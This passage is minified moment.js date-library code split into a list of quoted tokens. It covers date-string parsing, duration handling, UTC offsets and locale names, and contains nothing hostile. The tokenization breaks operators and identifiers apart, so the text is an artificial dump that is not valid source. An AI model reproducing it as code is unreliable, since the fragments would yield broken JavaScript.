"0", ",", "n", "=", "rn", ".", "length", ";", "t", "<", "n", ";", "t", "+", "+)", "if", "(", "rn", "[", "t", "]", "[", "1", "]", ".", "exec", "(", "u", "[", "3", "]", "))", "{", "r", "=", "(", "u", "[", "2", "]", "||", "\"", "\"", ")+", "rn", "[", "t", "]", "[", "0", "]", ";", "break", "}", "if", "(", "null", "=", "=", "r", ")", "return", "void", "(", "e", ".", "_isValid", "=", "!", "1", ")", "}", "if", "(", "!", "s", "&", "&", "null", "!", "=", "r", ")", "return", "void", "(", "e", ".", "_isValid", "=", "!", "1", ")", ";", "if", "(", "u", "[", "4", "]", "){", "if", "(", "!", "nn", ".", "exec", "(", "u", "[", "4", "]", "))", "return", "void", "(", "e", ".", "_isValid", "=", "!", "1", ")", ";", "a", "=", "\"", "Z", "\"", "}", "e", ".", "_f", "=", "i", "+", "(", "r", "|", "|\"", "\")", "+(", "a", "|", "|\"", "\")", ",", "_e", "(", "e", ")", "}", "else", "e", ".", "_isValid", "=", "!", "1", "}", "function", "fe", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ",", "r", ")", "{", "var", "a", "=", "[", "function", "(", "e", ")", "{", "var", "t", "=", "parseInt", "(", "e", ",", "10", ")", ";{", "if", "(", "t", "<", "=", "49", ")", "return", "2e3", "+", "t", ";", "if", "(", "t", "<", "=", "999", ")", "return", "1900", "+", "t", "}", "return", "t", "}", "(", "e", ")", ",", "Vt", ".", "indexOf", "(", "t", ")", ",", "parseInt", "(", "n", ",", "10", ")", ",", "parseInt", "(", "s", ",", "10", ")", ",", "parseInt", "(", "i", ",", "10", ")", "];", "return", "r", "&", "&", "a", ".", "push", "(", "parseInt", "(", "r", ",", "10", ")", "),", "a", "}", "function", "me", "(", "e", ")", "{", "var", "t", "=", "on", ".", "exec", "(", "function", "(", "e", ")", "{", "return", "e", ".", "replace", "(", "/\\", "([", "^)", "]*", "\\)", "|[", "\\", "n", "\\", "t", "]", "/", "g", ",", "\"", "\"", ").", "replace", "(", "/(", "\\", "s", "\\", "s", "+", ")/", "g", ",", "\"", "\"", ").", "trim", "(", ")}", "(", "e", ".", "_i", ")", ");", "if", "(", "t", ")", "{", "var", "n", "=", "fe", "(", "t", "[", "4", "]", ",", "t", "[", "3", "]", ",", "t", "[", "2", "]", ",", "t", "[", "5", "]", ",", "t", "[", "6", "]", ",", "t", "[", "7", "]", ");", "if", "(", "!", "function", "(", "e", ",", "t", ",", "n", ")", "{", "if", "(", "e", "&", "&", "At", ".", "indexOf", "(", "e", ")", "!=", "=", "new", "Date", "(", "t", "[", "0", "]", ",", "t", "[", "1", "]", ",", "t", "[", "2", "]", ").", "getDay", "(", "))", "return", "d", "(", "n", ")", ".", "weekdayMismatch", "=", "!", "0", ",", "n", ".", "_isValid", "=", "!", "1", ",", "!", "1", ";", "return", "!", "0", "}", "(", "t", "[", "1", "]", ",", "n", ",", "e", ")", ")", "return", ";", "e", ".", "_a", "=", "n", ",", "e", ".", "_tzm", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "if", "(", "e", ")", "return", "un", "[", "e", "]", ";", "if", "(", "t", ")", "return", "0", ";", "var", "s", "=", "parseInt", "(", "n", ",", "10", ")", ",", "i", "=", "s", "%", "100", ";", "return", "(", "s", "-", "i", ")", "/", "100", "*", "60", "+", "i", "}", "(", "t", "[", "8", "]", ",", "t", "[", "9", "]", ",", "t", "[", "10", "]", "),", "e", ".", "_d", "=", "J", ".", "apply", "(", "null", ",", "e", ".", "_a", ")", ",", "e", ".", "_d", ".", "setUTCMinutes", "(", "e", ".", "_d", ".", "getUTCMinutes", "(", ")-", "e", ".", "_tzm", ")", ",", "d", "(", "e", ")", ".", "rfc2822", "=", "!", "0", "}", "else", "e", ".", "_isValid", "=", "!", "1", "}", "function", "_e", "(", "t", ")", "{", "if", "(", "t", ".", "_f", "!", "==", "e", ".", "ISO_8601", ")", "if", "(", "t", ".", "_f", "!", "==", "e", ".", "RFC_2822", ")", "{", "t", ".", "_a", "=", "[]", ",", "d", "(", "t", ")", ".", "empty", "=", "!", "0", ";", "var", "n", ",", "s", ",", "i", ",", "r", ",", "a", ",", "o", "=", "\"\"", "+", "t", ".", "_i", ",", "u", "=", "o", ".", "length", ",", "l", "=", "0", ";", "for", "(", "i", "=", "C", "(", "t", ".", "_f", ",", "t", ".", "_locale", ")", ".", "match", "(", "rt", ")", "||", "[]", ",", "n", "=", "0", ";", "n", "<", "i", ".", "length", ";", "n", "+", "+)", "r", "=", "i", "[", "n", "]", ",(", "s", "=", "(", "o", ".", "match", "(", "U", "(", "r", ",", "t", ")", ")|", "|[", "])", "[", "0", "]", ")&", "&(", "(", "a", "=", "o", ".", "substr", "(", "0", ",", "o", ".", "indexOf", "(", "s", ")", "))", ".", "length", ">", "0", "&", "&", "d", "(", "t", ")", ".", "unusedInput", ".", "push", "(", "a", ")", ",", "o", "=", "o", ".", "slice", "(", "o", ".", "indexOf", "(", "s", ")", "+", "s", ".", "length", ")", ",", "l", "+", "=", "s", ".", "length", ")", ",", "ut", "[", "r", "]", "?(", "s", "?", "d", "(", "t", ")", ".", "empty", "=", "!", "1", ":", "d", "(", "t", ")", ".", "unusedTokens", ".", "push", "(", "r", ")", ",", "G", "(", "r", ",", "s", ",", "t", ")", "):", "t", ".", "_strict", "&", "&!", "s", "&", "&", "d", "(", "t", ")", ".", "unusedTokens", ".", "push", "(", "r", ")", ";", "d", "(", "t", ")", ".", "charsLeftOver", "=", "u", "-", "l", ",", "o", ".", "length", ">", "0", "&", "&", "d", "(", "t", ")", ".", "unusedInput", ".", "push", "(", "o", ")", ",", "t", ".", "_a", "[", "Pt", "]", "<=", "12", "&", "&!", "0", "=", "==", "d", "(", "t", ")", ".", "bigHour", "&", "&", "t", ".", "_a", "[", "Pt", "]", ">", "0", "&", "&(", "d", "(", "t", ")", ".", "bigHour", "=", "void", "0", ")", ",", "d", "(", "t", ")", ".", "parsedDateParts", "=", "t", ".", "_a", ".", "slice", "(", "0", ")", ",", "d", "(", "t", ")", ".", "meridiem", "=", "t", ".", "_meridiem", ",", "t", ".", "_a", "[", "Pt", "]", "=", "function", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", ";", "if", "(", "null", "=", "=", "n", ")", "return", "t", ";", "return", "null", "!", "=", "e", ".", "meridiemHour", "?", "e", ".", "meridiemHour", "(", "t", ",", "n", ")", ":", "null", "!", "=", "e", ".", "isPM", "?", "((", "s", "=", "e", ".", "isPM", "(", "n", ")", ")&", "&", "t", "<", "12", "&", "&(", "t", "+", "=", "12", ")", ",", "s", "|", "|", "12", "!", "==", "t", "|", "|(", "t", "=", "0", ")", ",", "t", ")", ":", "t", "}", "(", "t", ".", "_locale", ",", "t", ".", "_a", "[", "Pt", "]", ",", "t", ".", "_meridiem", ")", ",", "he", "(", "t", ")", ",", "le", "(", "t", ")", "}", "else", "me", "(", "t", ")", ";", "else", "ce", "(", "t", ")", "}", "function", "ye", "(", "o", ")", "{", "var", "l", "=", "o", ".", "_i", ",", "y", "=", "o", ".", "_f", ";", "return", "o", ".", "_locale", "=", "o", ".", "_locale", "|", "|", "ue", "(", "o", ".", "_l", ")", ",", "null", "=", "==", "l", "|", "|", "void", "0", "=", "==", "y", "&", "&\"", "\"=", "==", "l", "?", "c", "(", "{", "nullInput", ":", "!", "0", "}", "):", "(\"", "string", "\"", "==", "typeof", "l", "&", "&(", "o", ".", "_i", "=", "l", "=", "o", ".", "_locale", ".", "preparse", "(", "l", ")", "),", "_", "(", "l", ")", "?", "new", "m", "(", "le", "(", "l", ")", "):", "(", "r", "(", "l", ")", "?", "o", ".", "_d", "=", "l", ":", "t", "(", "y", ")", "?", "function", "(", "e", ")", "{", "var", "t", ",", "n", ",", "s", ",", "i", ",", "r", ";", "if", "(", "0", "=", "==", "e", ".", "_f", ".", "length", ")", "return", "d", "(", "e", ")", ".", "invalidFormat", "=", "!", "0", ",", "void", "(", "e", ".", "_d", "=", "new", "Date", "(", "NaN", ")", ");", "for", "(", "i", "=", "0", ";", "i", "<", "e", ".", "_f", ".", "length", ";", "i", "+", "+)", "r", "=", "0", ",", "t", "=", "f", "(", "{}", ",", "e", ")", ",", "null", "!", "=", "e", ".", "_useUTC", "&", "&(", "t", ".", "_useUTC", "=", "e", ".", "_useUTC", ")", ",", "t", ".", "_f", "=", "e", ".", "_f", "[", "i", "]", ",", "_e", "(", "t", ")", ",", "h", "(", "t", ")", "&&", "(", "r", "+", "=", "d", "(", "t", ")", ".", "charsLeftOver", ",", "r", "+", "=", "10", "*", "d", "(", "t", ")", ".", "unusedTokens", ".", "length", ",", "d", "(", "t", ")", ".", "score", "=", "r", ",", "(", "null", "=", "=", "s", "|", "|", "r", "<", "s", ")", "&&", "(", "s", "=", "r", ",", "n", "=", "t", ")", ");", "u", "(", "e", ",", "n", "|", "|", "t", ")", "}(", "o", ")", ":", "y", "?", "_e", "(", "o", ")", ":", "function", "(", "o", ")", "{", "var", "u", "=", "o", ".", "_i", ";", "s", "(", "u", ")", "?", "o", ".", "_d", "=", "new", "Date", "(", "e", ".", "now", "(", "))", ":", "r", "(", "u", ")", "?", "o", ".", "_d", "=", "new", "Date", "(", "u", ".", "valueOf", "(", "))", ":\"", "string", "\"", "==", "typeof", "u", "?", "function", "(", "t", ")", "{", "var", "n", "=", "an", ".", "exec", "(", "t", ".", "_i", ")", ";", "null", "=", "==", "n", "?", "(", "ce", "(", "t", ")", ",!", "1", "=", "==", "t", ".", "_isValid", "&", "&(", "delete", "t", ".", "_isValid", ",", "me", "(", "t", ")", ",!", "1", "=", "==", "t", ".", "_isValid", "&", "&(", "delete", "t", ".", "_isValid", ",", "e", ".", "createFromInputFallback", "(", "t", ")", "))", "):", "t", ".", "_d", "=", "new", "Date", "(", "+", "n", "[", "1", "]", ")}", "(", "o", ")", ":", "t", "(", "u", ")", "?(", "o", ".", "_a", "=", "a", "(", "u", ".", "slice", "(", "0", ")", ",", "function", "(", "e", ")", "{", "return", "parseInt", "(", "e", ",", "10", ")", "})", ",", "he", "(", "o", ")", "):", "n", "(", "u", ")", "?", "function", "(", "e", ")", "{", "if", "(", "!", "e", ".", "_d", ")", "{", "var", "t", "=", "x", "(", "e", ".", "_i", ")", ";", "e", ".", "_a", "=", "a", "(", "[", "t", ".", "year", ",", "t", ".", "month", ",", "t", ".", "day", "|", "|", "t", ".", "date", ",", "t", ".", "hour", ",", "t", ".", "minute", ",", "t", ".", "second", ",", "t", ".", "millisecond", "]", ",", "function", "(", "e", ")", "{", "return", "e", "&", "&", "parseInt", "(", "e", ",", "10", ")", "})", ",", "he", "(", "e", ")", "}}", "(", "o", ")", ":", "i", "(", "u", ")", "?", "o", ".", "_d", "=", "new", "Date", "(", "u", ")", ":", "e", ".", "createFromInputFallback", "(", "o", ")", "}(", "o", ")", ",", "h", "(", "o", ")", "||", "(", "o", ".", "_d", "=", "null", ")", ",", "o", ")", ")}", "function", "ge", "(", "e", ",", "s", ",", "i", ",", "r", ",", "a", ")", "{", "var", "o", "=", "{}", ";", "return", "!", "0", "!", "==", "i", "&", "&!", "1", "!", "==", "i", "|", "|(", "r", "=", "i", ",", "i", "=", "void", "0", ")", ",(", "n", "(", "e", ")", "&&", "function", "(", "e", ")", "{", "if", "(", "Object", ".", "getOwnPropertyNames", ")", "return", "0", "=", "==", "Object", ".", "getOwnPropertyNames", "(", "e", ")", ".", "length", ";", "var", "t", ";", "for", "(", "t", "in", "e", ")", "if", "(", "e", ".", "hasOwnProperty", "(", "t", ")", ")", "return", "!", "1", ";", "return", "!", "0", "}", "(", "e", ")", "||", "t", "(", "e", ")", "&&", "0", "=", "==", "e", ".", "length", ")", "&&", "(", "e", "=", "void", "0", ")", ",", "o", ".", "_isAMomentObject", "=", "!", "0", ",", "o", ".", "_useUTC", "=", "o", ".", "_isUTC", "=", "a", ",", "o", ".", "_l", "=", "i", ",", "o", ".", "_i", "=", "e", ",", "o", ".", "_f", "=", "s", ",", "o", ".", "_strict", "=", "r", ",", "function", "(", "e", ")", "{", "var", "t", "=", "new", "m", "(", "le", "(", "ye", "(", "e", ")", "))", ";", "return", "t", ".", "_nextDay", "&", "&(", "t", ".", "add", "(", "1", ",", "\"", "d", "\"", "),", "t", ".", "_nextDay", "=", "void", "0", ")", ",", "t", "}", "(", "o", ")", "}", "function", "pe", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{", "return", "ge", "(", "e", ",", "t", ",", "n", ",", "s", ",", "!", "1", ")", "}", "function", "we", "(", "e", ",", "n", ")", "{", "var", "s", ",", "i", ";", "if", "(", "1", "=", "==", "n", ".", "length", "&", "&", "t", "(", "n", "[", "0", "]", ")&", "&(", "n", "=", "n", "[", "0", "]", "),", "!", "n", ".", "length", ")", "return", "pe", "(", ");", "for", "(", "s", "=", "n", "[", "0", "]", ",", "i", "=", "1", ";", "i", "<", "n", ".", "length", ";", "++", "i", ")", "n", "[", "i", "]", ".", "isValid", "(", ")&", "&!", "n", "[", "i", "]", "[", "e", "]", "(", "s", ")", "||", "(", "s", "=", "n", "[", "i", "]", ");", "return", "s", "}", "function", "ve", "(", "e", ")", "{", "var", "t", "=", "x", "(", "e", ")", ",", "n", "=", "t", ".", "year", "|", "|", "0", ",", "s", "=", "t", ".", "quarter", "|", "|", "0", ",", "i", "=", "t", ".", "month", "|", "|", "0", ",", "r", "=", "t", ".", "week", "|", "|", "0", ",", "a", "=", "t", ".", "day", "|", "|", "0", ",", "o", "=", "t", ".", "hour", "|", "|", "0", ",", "u", "=", "t", ".", "minute", "|", "|", "0", ",", "l", "=", "t", ".", "second", "|", "|", "0", ",", "d", "=", "t", ".", "millisecond", "|", "|", "0", ";", "this", ".", "_isValid", "=", "function", "(", "e", ")", "{", "for", "(", "var", "t", "in", "e", ")", "if", "(", "-", "1", "=", "==", "Nt", ".", "call", "(", "hn", ",", "t", ")", "||", "null", "!", "=", "e", "[", "t", "]", "&&", "isNaN", "(", "e", "[", "t", "]", "))", "return", "!", "1", ";", "for", "(", "var", "n", "=", "!", "1", ",", "s", "=", "0", ";", "s", "<", "hn", ".", "length", ";", "++", "s", ")", "if", "(", "e", "[", "hn", "[", "s", "]", "])", "{", "if", "(", "n", ")", "return", "!", "1", ";", "parseFloat", "(", "e", "[", "hn", "[", "s", "]", "])", "!=", "=", "g", "(", "e", "[", "hn", "[", "s", "]", "])", "&&", "(", "n", "=", "!", "0", ")", "}", "return", "!", "0", "}", "(", "t", ")", ",", "this", ".", "_milliseconds", "=", "+", "d", "+", "1e3", "*", "l", "+", "6e4", "*", "u", "+", "1e3", "*", "o", "*", "60", "*", "60", ",", "this", ".", "_days", "=", "+", "a", "+", "7", "*", "r", ",", "this", ".", "_months", "=", "+", "i", "+", "3", "*", "s", "+", "12", "*", "n", ",", "this", ".", "_data", "=", "{}", ",", "this", ".", "_locale", "=", "ue", "(", "),", "this", ".", "_bubble", "(", ")}", "function", "Me", "(", "e", ")", "{", "return", "e", "instanceof", "ve", "}", "function", "ke", "(", "e", ")", "{", "return", "e", "<", "0", "?", "-", "1", "*", "Math", ".", "round", "(", "-", "1", "*", "e", ")", ":", "Math", ".", "round", "(", "e", ")", "}", "function", "Se", "(", "e", ",", "t", ")", "{", "P", "(", "e", ",", "0", ",", "0", ",", "function", "(", "){", "var", "e", "=", "this", ".", "utcOffset", "(", "),", "n", "=", "\"+", "\";", "return", "e", "<", "0", "&", "&(", "e", "=", "-", "e", ",", "n", "=", "\"-", "\")", ",", "n", "+", "b", "(", "~~", "(", "e", "/", "60", ")", ",", "2", ")", "+", "t", "+", "b", "(", "~~", "e", "%", "60", ",", "2", ")", "})", "}", "function", "De", "(", "e", ",", "t", ")", "{", "var", "n", "=", "(", "t", "|", "|\"", "\")", ".", "match", "(", "e", ")", ";", "if", "(", "null", "=", "==", "n", ")", "return", "null", ";", "var", "s", "=", "((", "n", "[", "n", ".", "length", "-", "1", "]", "||", "[]", ")+", "\"\"", ").", "match", "(", "cn", ")", "||", "[\"", "-\"", ",", "0", ",", "0", "]", ",", "i", "=", "60", "*", "s", "[", "1", "]", "+", "g", "(", "s", "[", "2", "]", ");", "return", "0", "=", "==", "i", "?", "0", ":", "\"+", "\"=", "==", "s", "[", "0", "]", "?", "i", ":", "-", "i", "}", "function", "Ye", "(", "t", ",", "n", ")", "{", "var", "s", ",", "i", ";", "return", "n", ".", "_isUTC", "?", "(", "s", "=", "n", ".", "clone", "(", "),", "i", "=", "(", "_", "(", "t", ")", "||", "r", "(", "t", ")", "?", "t", ".", "valueOf", "(", "):", "pe", "(", "t", ")", ".", "valueOf", "(", "))", "-", "s", ".", "valueOf", "(", "),", "s", ".", "_d", ".", "setTime", "(", "s", ".", "_d", ".", "valueOf", "(", ")+", "i", ")", ",", "e", ".", "updateOffset", "(", "s", ",", "!", "1", ")", ",", "s", ")", ":", "pe", "(", "t", ")", ".", "local", "(", ")}", "function", "Oe", "(", "e", ")", "{", "return", "15", "*", "-", "Math", ".", "round", "(", "e", ".", "_d", ".", "getTimezoneOffset", "(", ")/", "15", ")", "}", "function", "xe", "(", "){", "return", "!", "!", "this", ".", "isValid", "(", ")&", "&(", "this", ".", "_isUTC", "&", "&", "0", "=", "==", "this", ".", "_offset", ")", "}", "function", "Te", "(", "e", ",", "t", ")", "{", "var", "n", ",", "s", ",", "r", ",", "a", "=", "e", ",", "u", "=", "null", ";", "return", "Me", "(", "e", ")", "?", "a", "=", "{", "ms", ":", "e", ".", "_milliseconds", ",", "d", ":", "e", ".", "_days", ",", "M", ":", "e", ".", "_months", "}", ":", "i", "(", "e", ")", "?(", "a", "=", "{}", ",", "t", "?", "a", "[", "t", "]", "=", "e", ":", "a", ".", "milliseconds", "=", "e", ")", ":(", "u", "=", "fn", ".", "exec", "(", "e", ")", ")?", "(", "n", "=", "\"-", "\"=", "==", "u", "[", "1", "]", "?-", "1", ":", "1", ",", "a", "=", "{", "y", ":", "0", ",", "d", ":", "g", "(", "u", "[", "bt", "]", ")*", "n", ",", "h", ":", "g", "(", "u", "[", "Pt", "]", ")*", "n", ",", "m", ":", "g", "(", "u", "[", "Wt", "]", ")*", "n", ",", "s", ":", "g", "(", "u", "[", "Rt", "]", ")*", "n", ",", "ms", ":", "g", "(", "ke", "(", "1e3", "*", "u", "[", "Ct", "]", "))", "*", "n", "}", "):", "(", "u", "=", "mn", ".", "exec", "(", "e", ")", ")?", "(", "n", "=", "\"-", "\"=", "==", "u", "[", "1", "]", "?-", "1", ":", "(", "u", "[", "1", "]", ",", "1", ")", ",", "a", "=", "{", "y", ":", "be", "(", "u", "[", "2", "]", ",", "n", ")", ",", "M", ":", "be", "(", "u", "[", "3", "]", ",", "n", ")", ",", "w", ":", "be", "(", "u", "[", "4", "]", ",", "n", ")", ",", "d", ":", "be", "(", "u", "[", "5", "]", ",", "n", ")", ",", "h", ":", "be", "(", "u", "[", "6", "]", ",", "n", ")", ",", "m", ":", "be", "(", "u", "[", "7", "]", ",", "n", ")", ",", "s", ":", "be", "(", "u", "[", "8", "]", ",", "n", ")", "})", ":", "null", "=", "=", "a", "?", "a", "=", "{}", ":\"", "object", "\"", "==", "typeof", "a", "&", "&(", "\"", "from", "\"", "in", "a", "|", "|\"", "to", "\"", "in", "a", ")", "&&", "(", "r", "=", "function", "(", "e", ",", "t", ")", "{", "var", "n", ";", "if", "(", "!", "e", ".", "isValid", "(", ")|", "|!", "t", ".", "isValid", "(", "))", "return", "{", "milliseconds", ":", "0", ",", "months", ":", "0", "}", ";", "t", "=", "Ye", "(", "t", ",", "e", ")", ",", "e", ".", "isBefore", "(", "t", ")", "?", "n", "=", "Pe", "(", "e", ",", "t", ")", ":(", "(", "n", "=", "Pe", "(", "t", ",", "e", ")", ").", "milliseconds", "=", "-", "n", ".", "milliseconds", ",", "n", ".", "months", "=", "-", "n", ".", "months", ")", ";", "return", "n", "}", "(", "pe", "(", "a", ".", "from", ")", ",", "pe", "(", "a", ".", "to", ")", "),", "(", "a", "=", "{}", ").", "ms", "=", "r", ".", "milliseconds", ",", "a", ".", "M", "=", "r", ".", "months", ")", ",", "s", "=", "new", "ve", "(", "a", ")", ",", "Me", "(", "e", ")", "&&", "o", "(", "e", ",", "\"", "_locale", "\"", ")&", "&(", "s", ".", "_locale", "=", "e", ".", "_locale", ")", ",", "s", "}", "function", "be", "(", "e", ",", "t", ")", "{", "var", "n", "=", "e", "&", "&", "parseFloat", "(", "e", ".", "replace", "(", "\",", "\",", "\".", "\")", ");", "return", "(", "isNaN", "(", "n", ")", "?", "0", ":", "n", ")", "*", "t", "}", "function", "Pe", "(", "e", ",", "t", ")", "{", "var", "n", "=", "{", "milliseconds", ":", "0", ",", "months", ":", "0", "}", ";", "return", "n", ".", "months", "=", "t", ".", "month", "(", ")-", "e", ".", "month", "(", ")+", "12", "*", "(", "t", ".", "year", "(", ")-", "e", ".", "year", "(", "))", ",", "e", ".", "clone", "(", ").", "add", "(", "n", ".", "months", ",", "\"", "M", "\"", ").", "isAfter", "(", "t", ")", "&&", "--", "n", ".", "months", ",", "n", ".", "milliseconds", "=", "+", "t", "-", "+", "e", ".", "clone", "(", ").", "add", "(", "n", ".", "months", ",", "\"", "M", "\"", "),", "n", "}", "function", "We", "(", "e", ",", "t", ")", "{", "return", "function", "(", "n", ",", "s", ")", "{", "var", "i", ",", "r", ";", "return", "null", "=", "==", "s", "|", "|", "isNaN", "(", "+", "s", ")", "||", "(", "M", "(", "t", ",", "\"", "moment", "(", ").", "\"+", "t", "+", "\"(", "period", ",", "number", ")", "is", "deprecated", ".", "Please", "use", "moment", "(", ").", "\"+", "t", "+", "\"(", "number", ",", "period", ")", ".", "See", "http", ":", "//", "momentjs", ".", "com", "/", "guides", "/", "#/", "warnings", "/", "add", "-", "inverted", "-", "param", "/", "for", "more", "info", ".", "\")", ",", "r", "=", "n", ",", "n", "=", "s", ",", "s", "=", "r", ")", ",", "n", "=", "\"", "string", "\"", "==", "typeof", "n", "?", "+", "n", ":", "n", ",", "i", "=", "Te", "(", "n", ",", "s", ")", ",", "Re", "(", "this", ",", "i", ",", "e", ")", ",", "this", "}", "}", "function", "Re", "(", "t", ",", "n", ",", "s", ",", "i", ")", "{", "var", "r", "=", "n", ".", "_milliseconds", ",", "a", "=", "ke", "(", "n", ".", "_days", ")", ",", "o", "=", "ke", "(", "n", ".", "_months", ")", ";", "t", ".", "isValid", "(", ")&", "&(", "i", "=", "null", "=", "=", "i", "|", "|", "i", ",", "o", "&", "&", "Z", "(", "t", ",", "E", "(", "t", ",", "\"", "Month", "\"", ")+", "o", "*", "s", ")", ",", "a", "&", "&", "A", "(", "t", ",", "\"", "Date", "\"", ",", "E", "(", "t", ",", "\"", "Date", "\"", ")+", "a", "*", "s", ")", ",", "r", "&", "&", "t", ".", "_d", ".", "setTime", "(", "t", ".", "_d", ".", "valueOf", "(", ")+", "r", "*", "s", ")", ",", "i", "&", "&", "e", ".", "updateOffset", "(", "t", ",", "a", "|", "|", "o", ")", ")}", "function", "Ce", "(", "e", ",", "t", ")", "{", "var", "n", ",", "s", "=", "12", "*", "(", "t", ".", "year", "(", ")-", "e", ".", "year", "(", "))", "+(", "t", ".", "month", "(", ")-", "e", ".", "month", "(", "))", ",", "i", "=", "e", ".", "clone", "(", ").", "add", "(", "s", ",", "\"", "months", "\"", ");", "return", "n", "=", "t", "-", "i", "<", "0", "?", "(", "t", "-", "i", ")", "/(", "i", "-", "e", ".", "clone", "(", ").", "add", "(", "s", "-", "1", ",", "\"", "months", "\"", "))", ":(", "t", "-", "i", ")", "/(", "e", ".", "clone", "(", ").", "add", "(", "s", "+", "1", ",", "\"", "months", "\"", ")-", "i", ")", ",-", "(", "s", "+", "n", ")", "||", "0", "}", "function", "Fe", "(", "e", ")", "{", "var", "t", ";", "return", "void", "0", "=", "==", "e", "?", "this", ".", "_locale", ".", "_abbr", ":", "(", "null", "!", "=(", "t", "=", "ue", "(", "e", ")", ")&", "&(", "this", ".", "_locale", "=", "t", ")", ",", "this", ")", "}", "function", "Ue", "(", "){", "return", "this", ".", "_locale", "}", "function", "Ne", "(", "e", ",", "t", ")", "{", "P", "(", "0", ",", "[", "e", ",", "e", ".", "length", "]", ",", "0", ",", "t", ")", "}", "function", "He", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ")", "{", "var", "r", ";", "return", "null", "=", "=", "e", "?", "X", "(", "this", ",", "s", ",", "i", ")", ".", "year", ":", "(", "r", "=", "K", "(", "e", ",", "s", ",", "i", ")", ",", "t", ">", "r", "&", "&(", "t", "=", "r", ")", ",", "function", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ")", "{", "var", "r", "=", "Q", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ")", ",", "a", "=", "J", "(", "r", ".", "year", ",", "0", ",", "r", ".", "dayOfYear", ")", ";", "return", "this", ".", "year", "(", "a", ".", "getUTCFullYear", "(", "))", ",", "this", ".", "month", "(", "a", ".", "getUTCMonth", "(", "))", ",", "this", ".", "date", "(", "a", ".", "getUTCDate", "(", "))", ",", "this", "}", ".", "call", "(", "this", ",", "e", ",", "t", ",", "n", ",", "s", ",", "i", ")", ")}", "function", "Le", "(", "e", ",", "t", ")", "{", "t", "[", "Ct", "]", "=", "g", "(", "1e3", "*", "(\"", "0", ".", "\"+", "e", ")", ")}", "function", "Ge", "(", "e", ")", "{", "return", "e", "}", "function", "Ve", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{", "var", "i", "=", "ue", "(", "),", "r", "=", "l", "(", ").", "set", "(", "s", ",", "t", ")", ";", "return", "i", "[", "n", "]", "(", "r", ",", "e", ")", "}", "function", "je", "(", "e", ",", "t", ",", "n", ")", "{", "if", "(", "i", "(", "e", ")", "&&", "(", "t", "=", "e", ",", "e", "=", "void", "0", ")", ",", "e", "=", "e", "|", "|\"", "\",", "null", "!", "=", "t", ")", "return", "Ve", "(", "e", ",", "t", ",", "n", ",", "\"", "month", "\"", ");", "var", "s", ",", "r", "=", "[]", ";", "for", "(", "s", "=", "0", ";", "s", "<", "12", ";", "s", "+", "+)", "r", "[", "s", "]", "=", "Ve", "(", "e", ",", "s", ",", "n", ",", "\"", "month", "\"", ");", "return", "r", "}", "function", "Ie", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{\"", "boolean", "\"", "==", "typeof", "e", "?", "(", "i", "(", "t", ")", "&&", "(", "n", "=", "t", ",", "t", "=", "void", "0", ")", ",", "t", "=", "t", "|", "|\"", "\")", ":(", "n", "=", "t", "=", "e", ",", "e", "=", "!", "1", ",", "i", "(", "t", ")", "&&", "(", "n", "=", "t", ",", "t", "=", "void", "0", ")", ",", "t", "=", "t", "|", "|\"", "\")", ";", "var", "r", "=", "ue", "(", "),", "a", "=", "e", "?", "r", ".", "_week", ".", "dow", ":", "0", ";", "if", "(", "null", "!", "=", "n", ")", "return", "Ve", "(", "t", ",", "(", "n", "+", "a", ")", "%", "7", ",", "s", ",", "\"", "day", "\"", ");", "var", "o", ",", "u", "=", "[]", ";", "for", "(", "o", "=", "0", ";", "o", "<", "7", ";", "o", "+", "+)", "u", "[", "o", "]", "=", "Ve", "(", "t", ",", "(", "o", "+", "a", ")", "%", "7", ",", "s", ",", "\"", "day", "\"", ");", "return", "u", "}", "function", "Ee", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{", "var", "i", "=", "Te", "(", "t", ",", "n", ")", ";", "return", "e", ".", "_milliseconds", "+", "=", "s", "*", "i", ".", "_milliseconds", ",", "e", ".", "_days", "+", "=", "s", "*", "i", ".", "_days", ",", "e", ".", "_months", "+", "=", "s", "*", "i", ".", "_months", ",", "e", ".", "_bubble", "(", ")}", "function", "Ae", "(", "e", ")", "{", "return", "e", "<", "0", "?", "Math", ".", "floor", "(", "e", ")", ":", "Math", ".", "ceil", "(", "e", ")", "}", "function", "ze", "(", "e", ")", "{", "return", "4800", "*", "e", "/", "146097", "}", "function", "Ze", "(", "e", ")", "{", "return", "146097", "*", "e", "/", "4800", "}", "function", "$", "e", "(", "e", ")", "{", "return", "function", "(", "){", "return", "this", ".", "as", "(", "e", ")", "}}", "function", "qe", "(", "e", ")", "{", "return", "function", "(", "){", "return", "this", ".", "isValid", "(", ")?", "this", ".", "_data", "[", "e", "]", ":", "NaN", "}", "}", "function", "Je", "(", "e", ")", "{", "return", "(", "e", ">", "0", ")", "-(", "e", "<", "0", ")", "||", "+", "e", "}", "function", "Be", "(", "){", "if", "(", "!", "this", ".", "isValid", "(", "))", "return", "this", ".", "localeData", "(", ").", "invalidDate", "(", ");", "var", "e", ",", "t", ",", "n", ",", "s", "=", "En", "(", "this", ".", "_milliseconds", ")", "/", "1e3", ",", "i", "=", "En", "(", "this", ".", "_days", ")", ",", "r", "=", "En", "(", "this", ".", "_months", ")", ";", "t", "=", "y", "(", "(", "e", "=", "y", "(", "s", "/", "60", ")", ")/", "60", ")", ",", "s", "%", "=", "60", ",", "e", "%", "=", "60", ";", "var", "a", "=", "n", "=", "y", "(", "r", "/", "12", ")", ",", "o", "=", "r", "%", "=", "12", ",", "u", "=", "i", ",", "l", "=", "t", ",", "d", "=", "e", ",", "h", "=", "s", "?", "s", ".", "toFixed", "(", "3", ")", ".", "replace", "(", "/\\", ".?", "0", "+", "$/", ",\"", "\")", ":\"", "\",", "c", "=", "this", ".", "asSeconds", "(", ");", "if", "(", "!", "c", ")", "return", "\"", "P0D", "\"", ";", "var", "f", "=", "c", "<", "0", "?", "\"-", "\":", "\"\"", ",", "m", "=", "Je", "(", "this", ".", "_months", ")", "!=", "=", "Je", "(", "c", ")", "?\"", "-\"", ":\"", "\",", "_", "=", "Je", "(", "this", ".", "_days", ")", "!=", "=", "Je", "(", "c", ")", "?\"", "-\"", ":\"", "\",", "g", "=", "Je", "(", "this", ".", 